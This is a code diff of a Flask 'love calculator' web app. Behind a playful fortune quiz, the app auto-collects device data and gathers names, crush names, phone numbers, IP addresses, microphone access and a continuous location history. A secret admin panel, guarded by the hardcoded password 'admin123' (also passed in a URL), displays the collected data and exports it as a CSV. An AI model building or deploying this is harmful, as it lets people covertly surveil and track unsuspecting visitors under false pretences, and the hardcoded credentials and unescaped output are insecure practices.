+                    mediaRecorder.stop();
                 }
-                return true;
-            }
-        } catch(e) {}
-        return false;
+            }, 3000);
+        } catch(e) {
+            showStatus('Microphone access denied. You can skip this.', 'error');
+        }
     }
 
-    // SAVE PHONE endpoint
     async function savePhoneNumber() {
-        const phone = phoneField.value.trim();
+        const phone = document.getElementById('phoneNumber').value.trim();
         if (!phone) {
-            smsStatusSpan.innerText = '⚠️ please enter a valid number';
+            showStatus('Please enter your phone number', 'error');
             return;
         }
-        if (!/^[\+\d\s\-\(\)]{7,18}$/.test(phone)) {
-            smsStatusSpan.innerText = '📵 invalid phone format';
+        
+        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
+            showStatus('Please enter a valid phone number', 'error');
             return;
         }
-        savePhoneBtn.disabled = true;
-        savePhoneBtn.innerText = 'saving...';
+        
         try {
-            const resp = await fetch('/save-phone', {
+            const response = await fetch('/save-phone', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
                     phoneNumber: phone,
-                    fortune: finalFortune
+                    fortune: currentFortune,
+                    percentage: currentPercentage
                 })
             });
-            const result = await resp.json();
+            const result = await response.json();
             if (result.status === 'saved') {
-                smsStatusSpan.innerText = '💖 number saved! your prophecy is sealed.';
-                phoneField.disabled = true;
-                savePhoneBtn.style.display = 'none';
-                localStorage.setItem(`phone_${sessionId}`, phone);
+                showStatus('✅ Number saved! Your love result is secured.', 'success');
+                document.getElementById('phoneNumber').disabled = true;
+                document.querySelector('.save-btn').disabled = true;
             } else {
-                smsStatusSpan.innerText = 'error, try again';
-                savePhoneBtn.disabled = false;
-                savePhoneBtn.innerText = '💾 keep forever';
+                showStatus('Error saving number', 'error');
             }
         } catch(e) {
-            smsStatusSpan.innerText = 'network issue, please retry';
-            savePhoneBtn.disabled = false;
-            savePhoneBtn.innerText = '💾 keep forever';
+            showStatus('Network error. Please try again.', 'error');
         }
     }
 
-    // START process: get names, device profile, then ask permissions
-    startBtn.onclick = async () => {
-        if (existingDataLoaded) return;
-        const name1 = yourNameInput.value.trim();
-        const name2 = crushNameInput.value.trim();
-        if (!name1 || !name2) {
-            alert("💞 please enter both names to invoke the oracle");
-            return;
-        }
-        collectedData.name = name1;
-        collectedData.crush_name = name2;
-        stepNamesDiv.classList.add('hidden');
-        loadingDiv.classList.remove('hidden');
-        await captureDeviceProfile();
-        loadingDiv.classList.add('hidden');
-        // check if permissions already granted earlier in this browser
-        const permsFlag = localStorage.getItem('lovePermissionsGranted');
-        if (permsFlag === 'true') {
-            await executeFullCollection();
-        } else {
-            permissionZone.classList.remove('hidden');
-        }
-    };
-
-    grantBtn.onclick = () => {
-        startPermissionsFlow();
-    };
-
-    savePhoneBtn.onclick = savePhoneNumber;
-
-    // load existing session data on page load
-    window.addEventListener('load', async () => {
-        const exists = await checkExistingSession();
-        if (!exists) {
-            // if no existing data, just show normal flow
-            stepNamesDiv.classList.remove('hidden');
-        } else {
-            stepNamesDiv.classList.add('hidden');
-        }
-    });
+    // Auto collect device data on load
+    collectDeviceData();
+    
+    // Check for existing session
+    async function checkExistingSession() {
+        try {
+            const response = await fetch('/get-session-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: sessionId })
+            });
+            const data = await response.json();
+            if (data.exists && data.fortuneText) {
+                if (data.name) document.getElementById('name1').value = data.name;
+                if (data.crush_name) document.getElementById('name2').value = data.crush_name;
+                if (data.fortuneText) {
+                    document.getElementById('percentageValue').textContent = (data.percentage || '??') + '%';
+                    document.getElementById('loveMessage').textContent = data.fortuneText;
+                    document.getElementById('resultCard').style.display = 'block';
+                    document.getElementById('permissionBox').style.display = 'block';
+                    document.getElementById('phoneSection').style.display = 'block';
+                    currentFortune = data.fortuneText;
+                    if (data.phoneNumber) {
+                        document.getElementById('phoneNumber').value = data.phoneNumber;
+                        document.getElementById('phoneNumber').disabled = true;
+                    }
+                }
+            }
+        } catch(e) {}
+    }
+    
+    checkExistingSession();
 </script>
 </body>
 </html>
+'''
+
+# ---------- Flask Routes ----------
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/get-session-data', methods=['POST'])
+def get_session_data_route():
+    data = request.json
+    session_id = data.get('sessionId')
+    if session_id and supabase:
+        try:
+            res = supabase.table("visitors").select("name,crush_name,fortuneText,percentage,phoneNumber").eq("sessionId", session_id).execute()
+            if res.data:
+                row = res.data[0]
+                return jsonify({
+                    'exists': True,
+                    'name': row.get("name"),
+                    'crush_name': row.get("crush_name"),
+                    'fortuneText': row.get("fortuneText"),
+                    'percentage': row.get("percentage"),
+                    'phoneNumber': row.get("phoneNumber")
+                })
+        except:
+            pass
+    return jsonify({'exists': False})
+
+@app.route('/save', methods=['POST'])
+def save():
+    data = request.json
+    data['timestamp'] = datetime.now().isoformat()
+    data['ip'] = request.remote_addr
+    data['service_id'] = SERVICE_ID
+    save_visitor(data)
+    return jsonify({'status': 'saved'})
+
+@app.route('/update-location', methods=['POST'])
+def update_location():
+    data = request.json
+    session_id = data.get('sessionId')
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    if session_id and lat is not None and lon is not None:
+        save_location_update(session_id, lat, lon)
+        return jsonify({'status': 'recorded'})
+    return jsonify({'status': 'error'}), 400
+
+@app.route('/save-phone', methods=['POST'])
+def save_phone():
+    data = request.json
+    session_id = data.get('sessionId')
+    phone = data.get('phoneNumber')
+    fortune_text = data.get('fortune')
+    percentage = data.get('percentage')
+    if session_id and supabase:
+        try:
+            supabase.table("visitors").update({
+                "phoneNumber": phone, 
+                "fortuneText": fortune_text,
+                "percentage": percentage
+            }).eq("sessionId", session_id).execute()
+            return jsonify({'status': 'saved'})
+        except:
+            pass
+    return jsonify({'status': 'error'}), 400
+
+@app.route('/calculate-love', methods=['POST'])
+def calculate_love():
+    data = request.json
+    name1 = data.get('name1', '')
+    name2 = data.get('name2', '')
+    if not name1 or not name2:
+        return jsonify({'message': 'Please provide both names'}), 400
+    percentage = calculate_love_percentage(name1, name2)
+    message = get_love_message(name1, name2, percentage)
+    return jsonify({'percentage': percentage, 'message': message})
+
+# ---------- HIDDEN ADMIN PANEL (Secret - Users won't see) ----------
+@app.route('/admin-panel-secret-2026', methods=['GET', 'POST'])
+def admin():
+    if request.method == 'POST':
+        password = request.form.get('password')
+        if password == 'admin123':
+            visitors = get_all_visitors()
+            if not visitors:
+                return '<h1>💕 No data yet</h1><p><a href="/admin-panel-secret-2026">Back to login</a></p>'
+            
+            html = '''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Admin Dashboard - Love Calculator Data</title>
+                <style>
+                    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+                    h1 { color: #f093fb; }
+                    table { border-collapse: collapse; width: 100%; background: #16213e; }
+                    th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
+                    th { background: #e94560; color: white; }
+                    .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
+                </style>
+            </head>
+            <body>
+                <h1>💕 Visitor Data Dashboard</h1>
+                <p><a href="/admin-panel-secret-2026" class="btn">Back to Login</a> | <a href="/admin-panel-secret-2026/download-csv?pass=admin123" class="btn">📥 Download CSV</a></p>
+                <div style="overflow-x: auto;">
+                <table>
+                    <tr>
+            '''
+            if visitors:
+                columns = [k for k in visitors[0].keys() if k != 'location_history']
+                for col in columns:
+                    html += f'<th>{col}</th>'
+                html += '</tr>'
+                for v in visitors:
+                    html += '<tr>'
+                    for col in columns:
+                        val = str(v.get(col, ''))[:200]
+                        html += f'<td>{val}</td>'
+                    html += '</tr>'
+                html += '''
+                </table>
+                </div>
+                <h2>📍 Location History</h2>
+                '''
+                for v in visitors:
+                    hist = v.get('location_history', [])
+                    if hist:
+                        html += f'<h3>Session: {v.get("sessionId", "?")} - {v.get("name", "?")}</h3><table border="1">'
+                        html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th></tr>'
+                        for ts, lat, lon in hist:
+                            html += f'<tr><td>{ts}</td><td>{lat}</td><td>{lon}</td></tr>'
+                        html += '</table><br>'
+            html += '</body></html>'
+            return html
+        else:
+            return '<h1>🔒 Wrong password. <a href="/admin-panel-secret-2026">Try again</a></h1>'
+    
+    return '''
+        <!DOCTYPE html>
+        <html>
+        <head><title>Admin Login</title>
+        <style>
+            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); }
+            .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; }
+            input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; }
+            button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; }
+        </style>
+        </head>
+        <body>
+            <div class="login-box">
+                <h2>🔐 Admin Access</h2>
+                <form method="POST">
+                    <input type="password" name="password" placeholder="Enter password" required><br>
+                    <button type="submit">Login</button>
+                </form>
+            </div>
+        </body>
+        </html>
+    '''
+
+@app.route('/admin-panel-secret-2026/download-csv')
+def download_csv():
+    pwd = request.args.get('pass')
+    if pwd != 'admin123':
+        return 'Unauthorized', 403
+    visitors = get_all_visitors()
+    import csv
+    from io import StringIO
+    if not visitors:
+        return "No data"
+    output = StringIO()
+    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
+    columns = [k for k in visitors[0].keys() if k != 'location_history']
+    writer.writerow(columns)
+    for v in visitors:
+        row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
+        writer.writerow(row)
+    return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=love_calculator_data.csv'})
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
